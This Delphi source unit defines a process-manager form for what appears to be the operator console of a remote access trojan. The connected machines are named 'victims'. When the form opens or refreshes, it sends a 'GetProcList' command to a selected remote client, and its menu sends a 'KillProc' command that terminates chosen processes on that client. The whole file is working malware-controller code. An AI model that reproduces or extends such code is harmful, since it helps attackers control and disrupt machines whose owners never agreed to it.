unit FrmProcess;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.Menus, Vcl.ComCtrls;

type
  TForm18 = class(TForm)
    ListView1: TListView;
    processesPopup: TPopupMenu;
    R1: TMenuItem;
    K1: TMenuItem;
    procedure FormShow(Sender: TObject);
    procedure R1Click(Sender: TObject);
    procedure K1Click(Sender: TObject);
  private
    { Private declarations }
  public
    ThisFormsVictimID: string;
  end;

var
  Form18: TForm18;

implementation

{$R *.dfm}

uses FrmMain;

procedure SendToSelectedClient(const VictimID, Msg: string);
var
  I: Integer;
  NickName: string;
  UserData: TConnectedUserData;
begin
  NickName := VictimID;
  for I := 0 to Form1.ConnectedUsers.Count - 1 do
  begin
    UserData := TConnectedUserData(Form1.ConnectedUsers.Objects[I]);
    if UserData.ID = NickName then
    begin
      Form1.ServerSource.ExecCommand(UserData.Line, 0, BytesOf(Msg), False);
      Exit;
    end;
  end;
end;

procedure TForm18.FormShow(Sender: TObject);
begin
  SendToSelectedClient(ThisFormsVictimID, 'GetProcList|');
end;

procedure TForm18.K1Click(Sender: TObject);
begin
  SendToSelectedClient(ThisFormsVictimID,
    'KillProc|' + ListView1.Selected.SubItems[0]);
end;

procedure TForm18.R1Click(Sender: TObject);
begin
  SendToSelectedClient(ThisFormsVictimID, 'GetProcList|');
end;

end.
